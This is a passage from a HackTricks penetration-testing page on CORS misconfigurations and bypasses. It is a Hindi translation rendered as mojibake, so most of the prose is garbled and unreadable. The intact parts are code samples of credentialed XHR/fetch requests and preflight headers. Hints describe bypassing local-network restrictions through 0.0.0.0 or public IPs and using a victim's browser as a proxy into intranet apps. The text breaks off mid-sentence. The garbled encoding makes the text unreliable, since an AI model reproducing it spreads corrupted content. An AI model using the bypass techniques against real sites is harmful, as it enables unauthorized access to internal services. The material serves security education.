# CORS - Misconfigurations & Bypass

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## CORS рдХреНрдпрд╛ рд╣реИ?

Cross-Origin Resource Sharing (CORS) рдорд╛рдирдХ **рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдЙрдирдХреЗ рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рддрдХ рдХреМрди рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ **рдХрд┐рд╕ HTTP рдЕрдиреБрд░реЛрдз рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ** рдпрд╣ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдмрд╛рд╣реНрдп рд╕реНрд░реЛрддреЛрдВ рд╕реЗред

рдПрдХ **рд╕рдорд╛рди-рдореВрд▓** рдиреАрддрд┐ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рдПрдХ **рд╕рд░реНрд╡рд░ рдЬреЛ** рдПрдХ рд╕рдВрд╕рд╛рдзрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рд╕рдВрд╕рд╛рдзрди рдХреЛ **рд╣реЛрд╕реНрдЯ** рдХрд░ рд░рд╣рд╛ рд╣реИ рд╡реЗ рдПрдХ рд╣реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (рдЬреИрд╕реЗ, `http://`), рдбреЛрдореЗрди рдирд╛рдо (рдЬреИрд╕реЗ, `internal-web.com`), рдФрд░ **рдкреЛрд░реНрдЯ** (рдЬреИрд╕реЗ, 80) рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред рдЗрд╕ рдиреАрддрд┐ рдХреЗ рддрд╣рдд, рдХреЗрд╡рд▓ рд╡реЗрдм рдкреГрд╖реНрда рдЬреЛ рдПрдХ рд╣реА рдбреЛрдореЗрди рдФрд░ рдкреЛрд░реНрдЯ рд╕реЗ рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред

`http://normal-website.com/example/example.html` рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕рдорд╛рди-рдореВрд▓ рдиреАрддрд┐ рдХрд╛ рдЕрдиреБрдкрд╛рд▓рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:

| рдпреВрдЖрд░рдПрд▓ рддрдХ рдкрд╣реБрдВрдЪрд╛ рдЧрдпрд╛ | рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐? |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | рд╣рд╛рдБ: рдПрдХ рд╣реА рдпреЛрдЬрдирд╛, рдбреЛрдореЗрди, рдФрд░ рдкреЛрд░реНрдЯ |
| `http://normal-website.com/example2/`     | рд╣рд╛рдБ: рдПрдХ рд╣реА рдпреЛрдЬрдирд╛, рдбреЛрдореЗрди, рдФрд░ рдкреЛрд░реНрдЯ |
| `https://normal-website.com/example/`     | рдирд╣реАрдВ: рд╡рд┐рднрд┐рдиреНрди рдпреЛрдЬрдирд╛ рдФрд░ рдкреЛрд░реНрдЯ      |
| `http://en.normal-website.com/example/`   | рдирд╣реАрдВ: рд╡рд┐рднрд┐рдиреНрди рдбреЛрдореЗрди               |
| `http://www.normal-website.com/example/`  | рдирд╣реАрдВ: рд╡рд┐рднрд┐рдиреНрди рдбреЛрдореЗрди               |
| `http://normal-website.com:8080/example/` | рдирд╣реАрдВ: рд╡рд┐рднрд┐рдиреНрди рдкреЛрд░реНрдЯ*                |

*рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░ рд╕рдорд╛рди-рдореВрд▓ рдиреАрддрд┐ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╕рдордп рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

### `Access-Control-Allow-Origin` рд╣реЗрдбрд░

рдпрд╣ рд╣реЗрдбрд░ **рдХрдИ рдореВрд▓** рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ, рдПрдХ **`null`** рдорд╛рди, рдпрд╛ рдПрдХ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб **`*`**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдХреЛрдИ рднреА рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХрдИ рдореВрд▓реЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛**, рдФрд░ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб `*` рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕реАрдорд╛рдУрдВ** рдХреЗ рдЕрдзреАрди рд╣реИред (рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЛ рдЕрдХреЗрд▓реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ `Access-Control-Allow-Credentials: true` рдХреЗ рд╕рд╛рде рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред)

рдпрд╣ рд╣реЗрдбрд░ **рдПрдХ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдПрдХ рд╡реЗрдмрд╕рд╛рдЗрдЯ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рд░рдВрднрд┐рдд рдПрдХ рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рд╕рдВрд╕рд╛рдзрди рдЕрдиреБрд░реЛрдз рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, рдЬрд┐рд╕рдореЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдПрдХ `Origin` рд╣реЗрдбрд░ рдЬреЛрдбрд╝рддрд╛ рд╣реИред

### `Access-Control-Allow-Credentials` рд╣реЗрдбрд░

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ, рдХреНрд░реЙрд╕-рдореВрд▓ рдЕрдиреБрд░реЛрдз рдХреБрдХреАрдЬрд╝ рдпрд╛ рдСрдерд░рд╛рдЗрдЬреЗрд╢рди рд╣реЗрдбрд░ рдЬреИрд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЗ рдмрд┐рдирд╛ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдлрд┐рд░ рднреА, рдЬрдм рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рд╕рд░реНрд╡рд░ `Access-Control-Allow-Credentials` рд╣реЗрдбрд░ рдХреЛ **`true`** рдкрд░ рд╕реЗрдЯ рдХрд░рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред

рдЕрдЧрд░ `true` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ (рдХреБрдХреАрдЬрд╝, рдСрдерд░рд╛рдЗрдЬреЗрд╢рди рд╣реЗрдбрд░, рдпрд╛ TLS рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ) рднреЗрдЬреЗрдЧрд╛ред
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз

### рдкрд╛рд░-рдбреЛрдореЗрди рд╕рдВрдЪрд╛рд░ рдореЗрдВ рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз рдХреЛ рд╕рдордЭрдирд╛

рд╡рд┐рд╢реЗрд╖ рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рддрд╣рдд рдкрд╛рд░-рдбреЛрдореЗрди рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рд░рдВрдн рдХрд░рддреЗ рд╕рдордп, рдЬреИрд╕реЗ рдХрд┐ **рд╕рд╛рдорд╛рдиреНрдп HTTP рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░рдирд╛** (HEAD, GET, POST рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдХреБрдЫ рднреА), рдирдП **рд╣реЗрдбрд░** рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛, рдпрд╛ рд╡рд┐рд╢реЗрд╖ **Content-Type рд╣реЗрдбрд░ рдорд╛рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛, рддреЛ рдПрдХ рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдпрд╣ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЕрдиреБрд░реЛрдз, **`OPTIONS`** рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рд╕рд░реНрд╡рд░ рдХреЛ рдЖрдЧрд╛рдореА рдкрд╛рд░-рд╕реНрд░реЛрдд рдЕрдиреБрд░реЛрдз рдХреА рдЗрдЪреНрдЫрд╛рдУрдВ рдХреА рд╕реВрдЪрдирд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╡рд╣ HTTP рд╡рд┐рдз
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
рдЬрд╡рд╛рдм рдореЗрдВ, рд╕рд░реНрд╡рд░ рд╕реНрд╡реАрдХреГрдд рдореЗрдердб рдХреА рд╕реВрдЪрдирд╛, рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ рдореВрд▓ рд╕реНрдерд╛рди, рдФрд░ рдЕрдиреНрдп CORS рдиреАрддрд┐ рд╡рд┐рд╡рд░рдг рджрд┐рдЦрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдиреАрдЪреЗ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
- **`Access-Control-Allow-Headers`**: рдпрд╣ рд╣реЗрдбрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЕрдиреБрд░реЛрдз рдХреЗ рджреМрд░рд╛рди рдХреМрди рд╕реЗ рд╣реЗрдбрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕реЗ рдЧреНрд░рд╛рд╣рдХ рд╕реЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рдЕрдиреБрдордд рд╣реЗрдбрд░реНрд╕ рдХреА рд╕реВрдЪреА рджрд┐рдЦрд╛рдИ рджреЗред
- **`Access-Control-Expose-Headers`**: рдЗрд╕ рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рд╕рд░реНрд╡рд░ рдЧреНрд░рд╛рд╣рдХ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕реЗ рд╣реЗрдбрд░реНрд╕ рдХреЛ рд╕рд╛рдзрд╛рд░рд┐рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- **`Access-Control-Max-Age`**: рдпрд╣ рд╣реЗрдбрд░ рдкреНрд░реА-рдлреНрд▓рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдз рдХреЗ рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЛ рдХрд┐рддрдиреА рджреЗрд░ рддрдХ рдХреИрд╢ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЗрд╕реЗ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред рд╕рд░реНрд╡рд░ рдкреНрд░реА-рдлреНрд▓рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдз рджреНрд╡рд╛рд░рд╛ рд╡рд╛рдкрд╕реА рдХреА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдХрд┐рддрдиреЗ рд╕реЗрдХрдВрдб рдореЗрдВ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред
- **`Access-Control-Request-Headers`**: рдкреНрд░реА-рдлреНрд▓рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рд╣реЗрдбрд░ рдЧреНрд░рд╛рд╣рдХ рджреНрд╡рд╛рд░рд╛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдХреМрди рд╕реЗ HTTP рд╣реЗрдбрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рдЙрд╕реЗ рд╕рд░реНрд╡рд░ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **`Access-Control-Request-Method`**: рдпрд╣ рд╣реЗрдбрд░, рдкреНрд░реА-рдлреНрд▓рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЧреНрд░рд╛рд╣рдХ рджреНрд╡рд╛рд░рд╛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдХреМрди рд╕рд╛ HTTP рд╡рд┐рдзрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕реЗ рд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **`Origin`**: рдпрд╣ рд╣реЗрдбрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдкрд╛рд░-рдореВрд▓ рд╕рдВрд╡рд╛рдж рдХреА рдореВрд▓ рд╕реНрдерд╛рди рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред рдпрд╣ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░ рд╕рдХреЗ рдХрд┐ рдХреНрдпрд╛ рдЖрдиреЗ рд╡рд╛рд▓рд╛ рдЕрдиреБрд░реЛрдз CORS рдиреАрддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП рдпрд╛ рдирд╣реАрдВред
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд▓рд┐рдирдХреНрд╕ **0.0.0.0** рдЖрдИрдкреА рдЗрди рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рджреБрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ localhost рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЖрдИрдкреА рдкрддрд╛ "рд╕реНрдерд╛рдиреАрдп" рдирд╣реАрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕реНрдерд╛рдиреАрдп рдЕрдВрдд рдмрд┐рдВрджреБ (рдЬреИрд╕реЗ рд░рд╛рдЙрдЯрд░ рдХрд╛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЖрдИрдкреА) рдХрд╛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЖрдИрдкреА рдкрддрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддреЛ **рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рджреБрд░ рдХрд░рдирд╛** рд╕рдВрднрд╡ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рдХрдИ рдЕрд╡рд╕реНрдерд╛рдУрдВ рдореЗрдВ, рдпрджрд┐ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЖрдИрдкреА** рддрдХ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдпрджрд┐ рдпрд╣ **рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ** рд╕реЗ рд╣реИ, рддреЛ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдПрдЧреАред
{% endhint %}

## рдЙрддреНрдкрд╛рджрдиреАрдп рдЧрд▓рддрд┐рдпрд╛рдБ

рдпрд╣ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ `Access-Control-Allow-Credentials` рдХреЛ **`true`** рдкрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рдЕрдзрд┐рдХрд╛рдВрд╢ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╣рдорд▓реЛрдВ** рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рд╣рдорд▓реЗ рдХреА рдкреНрд░рднрд╛рд╡рдХрд╛рд░рд┐рддрд╛ рдХреЛ рдмрдврд╝рд╛рддреА рд╣реИред рдЗрд╕рдХреЗ рдмрд┐рдирд╛, рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп рдЦреБрдж рд╕реЗ рдХрд░рдиреЗ рдХрд╛ рд▓рд╛рдн рдХрдо рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХреБрдХреАрдЬрд╝ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЕрд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

### рдЕрдкрд╡рд╛рдж: рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдерд╛рди рдХрд╛ рд╢реЛрд╖рдг

рдПрдХ рдЕрдкрд╡рд╛рдж рдореМрдЬреВрдж рд╣реИ рдЬрд╣рд╛рдВ рдкреАрдбрд╝рд┐рдд рдХрд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдерд╛рди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдкреАрдбрд╝рд┐рдд рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рд░реВрдк рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЖрдИрдкреА-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рджреБрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдВрдЯреНрд░рд╛рдиреЗрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдПред рдпрд╣ рд╡рд┐рдзрд┐ DNS rebinding рдХреЗ рд╕рд╛рде рд╕рдорд╛рди рдкреНрд░рднрд╛рд╡ рд╢реЗрдпрд░ рдХрд░рддреА рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рд╢реЛрд╖рдг рдХрд░рдирд╛ рд╕рд░рд▓ рд╣реИред

### `Access-Control-Allow-Origin` рдореЗрдВ `Origin` рдХрд╛ рдкреНрд░рддрд┐рдмрд┐рдореНрдм

рд╡рд╛рд╕реНрддрд╡рд┐рдХ рджреБрдирд┐рдпрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдЬрд╣рд╛рдВ `Origin` рд╣реЗрдбрд░ рдХреЗ рдорд╛рди рдХреЛ `Access-Control-Allow-Origin` рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рд╕рд┐рджреНрдзрд╛рдВрддрд╛рддреНрдордХ рд░реВрдк рд╕реЗ рдЕрд╕рдВрднрд╛рд╡ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрди рд╣реЗрдбрд░реНрд╕ рдХреЛ рдорд┐рд▓рд╛рди рдХрд░рдиреЗ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╡рд┐рдХрд╛рд╕рдХ `Access-Control-Allow-Origin` рд╣реЗрдбрд░ рдХреЛ рдмрд╣реБрдд рд╕реЗ URL рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `Origin` рд╣реЗрдбрд░ рдХреЗ рдорд╛рди рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рджреБрд░реБрдкрдпреЛрдЧ рд▓рд╛ рд╕рдХрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЬрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдбреЛрдореЗрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╡реИрдз рд▓рдЧрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЕрд╕рд▓реАрдХрд░рдг рддрд░реНрдХ 